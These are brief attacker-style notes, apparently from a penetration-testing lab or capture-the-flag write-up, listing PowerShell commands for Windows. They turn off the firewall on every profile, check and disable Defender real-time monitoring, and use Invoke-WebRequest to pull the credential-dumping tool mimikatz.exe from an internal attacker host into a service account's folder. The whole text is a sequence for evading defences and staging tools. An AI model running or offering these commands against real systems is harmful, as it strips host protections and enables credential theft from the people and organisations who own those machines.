Disabling firewall
Set-NetFirewallProfile -Profile Domain, Private,Public -Enabled False
Get-NetFirewallProfile | Select-Object Name, Enabled


To check if the "Real time monitoring is on"
Get-MpPreference | Select-Object DisableRealtimeMonitoring

To disable " Real time monitoring"
Set-MpPreference -DisableRealtimeMonitoring $true

The command below was used when Certutil failed
 Invoke-WebRequest -Uri http://10.10.10.17:8110/mimikatz.exe -OutFile C:\Users\app-svc\Downloads\mimikatz.exe

<img width="1016" height="508" alt="image" src="https://github.com/user-attachments/assets/7ec2d507-cbb3-4a59-a689-70524dcffb3b" />
